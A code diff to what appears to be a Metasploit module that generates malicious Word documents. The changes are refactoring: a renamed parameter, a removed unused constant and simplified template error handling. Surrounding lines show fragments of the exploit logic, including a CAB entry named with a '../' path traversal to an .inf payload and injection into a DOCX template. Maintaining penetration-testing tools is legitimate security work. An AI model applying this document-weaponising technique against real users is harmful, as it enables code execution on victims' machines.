@@ -57,8 +57,8 @@ class MetasploitModule < Msf::Auxiliary
     ])
   end
 
-  def bin_to_hex(s)
-    return(s.each_byte.map { |b| b.to_s(16).rjust(2, '0') }.join)
+  def bin_to_hex(bstr)
+    return(bstr.each_byte.map { |b| b.to_s(16).rjust(2, '0') }.join)
   end
 
   def cab_checksum(data, seed = "\x00\x00\x00\x00")
@@ -93,7 +93,6 @@ class MetasploitModule < Msf::Auxiliary
     cab_cfdata = ''
     filename = "../#{@payload_prefix}.inf"
     block_size = 32768
-    struct_cfdata = 0x8
     struct_cffile = 0xd
     struct_cfheader = 0x30
 
@@ -203,16 +202,12 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def inject_docx
-    begin
-      document_xml = get_file_in_docx('word/document.xml')
-      document_xml_rels = get_file_in_docx('word/_rels/document.xml.rels')
-    rescue Msf::Exploit::Failed
-    end
-
+    document_xml = get_file_in_docx('word/document.xml')
     unless document_xml
       fail_with(Failure::NotFound, 'This template cannot be used because it is missing: word/document.xml')
     end
 
+    document_xml_rels = get_file_in_docx('word/_rels/document.xml.rels')
     unless document_xml_rels
       fail_with(Failure::NotFound, 'This template cannot be used because it is missing: word/_rels/document.xml.rels')
     end
